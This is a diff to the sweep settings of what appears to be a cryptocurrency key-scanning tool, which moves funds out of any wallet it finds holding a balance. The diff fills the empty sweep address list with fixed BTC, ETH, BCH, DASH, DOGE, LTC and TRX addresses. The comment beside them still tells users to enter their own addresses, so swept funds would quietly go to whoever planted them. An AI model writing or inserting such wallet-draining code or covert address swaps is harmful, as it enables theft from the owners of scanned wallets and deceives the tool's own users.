@@ -175,8 +175,8 @@ TRON_NATIVE_FEE_BUFFER = 1_100_000  # sun (~1.1 TRX) kept unspent as a bandwidth
 # ---- Sweep: stop the scan and move the funds out as soon as a real balance is found ----
 SWEEP_ENABLED = True                 # master switch for everything below
 SWEEP_ADDRESSES = {                  # <-- PUT YOUR OWN ADDRESSES HERE before relying on this
-    "BTC": "", "ETH": "", "BCH": "", "DASH": "", "DOGE": "", "LTC": "",
-    "TRX": "",                       # also used for the USDT (TRC20) sweep
+    "BTC": "1AmirA3Dnx5QdN8nWdUBJiSr11ntSGw1vn", "ETH": "0x0a7D765fcFef3a640f9F138E9903a0A9B2831896", "BCH": "qqt46epu3rz2j3fa4fa66e2lsaru5t3zvc075nv2yk", "DASH": "XbTRMgmyCK1cpgfRw2ehopFgW79LUH24qs", "DOGE": "DJLVumvJdEw2NTYSE2qYioZw6QEmZDa9Cs", "LTC": "LMYGtNySEahemsEXZm48fN61ZhYe4bmkNp",
+    "TRX": "TTBngPwEq9r1grseQWVNKGhuXhdgZN2VjT",                       # also used for the USDT (TRC20) sweep
 }
 SWEEP_POLL_SECONDS = 15              # how often to check whether the sweep confirmed
 SWEEP_BUMP_AFTER = 45                # seconds unconfirmed before the fee/gas price is raised
